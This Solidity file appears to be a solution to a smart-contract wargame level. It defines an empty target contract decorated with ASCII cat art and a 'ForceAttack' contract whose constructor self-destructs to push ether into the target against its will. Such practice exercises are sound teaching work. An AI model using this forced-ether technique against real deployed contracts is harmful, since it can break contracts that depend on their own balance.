pragma solidity ^0.4.24;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}



contract ForceAttack {

    //it's always possible to transfer money to any account 
    constructor(address _victim) public payable {
        // victim = Force(_victim);
        selfdestruct(_victim);
    }
}
